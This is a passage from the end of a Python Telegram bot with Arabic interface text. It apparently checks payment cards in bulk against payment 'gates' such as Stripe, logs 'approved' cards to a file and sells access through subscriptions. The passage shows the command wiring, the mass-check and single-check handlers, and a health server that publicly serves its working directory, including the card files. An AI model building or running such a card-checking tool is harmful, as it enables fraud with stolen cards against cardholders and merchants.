        elif data.startswith("stop_"):
            cid = int(data.replace("stop_", ""))
            self.handler.stop_check(call, cid)

# ==================== إعداد البوت ====================
def setup():
    for f in [USERS_FILE, APPROVED_CARDS_FILE, STATS_FILE]:
        if not os.path.exists(f):
            with open(f, 'w') as ff:
                if f.endswith('.json'): json.dump({} if f!=STATS_FILE else {"total_checks":0}, ff)
                else: ff.write("# Approved Cards\n")
    
    handler = CommandHandler()
    callback = CallbackHandler(handler)
    
    @bot.message_handler(commands=['start'])
    def start(m): handler.handle_start(m)
    
    @bot.message_handler(commands=['help'])
    def help(m): handler.handle_help(m)
    
    @bot.message_handler(commands=['profile'])
    def profile(m): handler.handle_profile(m)
    
    @bot.message_handler(commands=['stats'])
    def stats(m): handler.handle_stats(m)
    
    @bot.message_handler(commands=['subscribe'])
    def sub(m): handler.handle_subscribe(m)
    
    @bot.message_handler(commands=['gates'])
    def gates(m): handler.handle_gates(m)
    
    @bot.message_handler(commands=['mass'])
    def mass(m): handler.handle_mass(m)
    
    for g in GATES:
        @bot.message_handler(commands=[g])
        def wrapped(m, g=g): handler.handle_single(m, g)
    
    @bot.message_handler(commands=['admin'])
    def admin(m):
        if m.from_user.id in ADMIN_IDS:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("➕ إضافة اشتراك", callback_data="admin_add"),
                      InlineKeyboardButton("➖ إزالة اشتراك", callback_data="admin_remove"))
            bot.reply_to(m, "👑 قائمة المشرفين", reply_markup=markup)
    
    @bot.message_handler(content_types=['document'])
    def doc(m): handler.handle_mass(m)
    
    @bot.message_handler(func=lambda m: True)
    def text(m): handler.handle_single(m, 'stripe') if '|' in m.text else bot.reply_to(m, "⚠️ أمر غير معروف")
    
    @bot.callback_query_handler(func=lambda c: True)
    def cb(c): callback.handle(c)
    
    # Health check server
    def run_health():
        port = int(os.environ.get('PORT', 10000))
        with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as httpd:
            print(f"🌐 Health check on {port}")
            httpd.serve_forever()
    
    threading.Thread(target=run_health, daemon=True).start()
    
    print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
    bot.infinity_polling()

# ==================== التشغيل ====================
if __name__ == "__main__":
    try:
        setup()
    except KeyboardInterrupt:
        print("\n⚠️ تم الإيقاف")
        sys.exit(0)
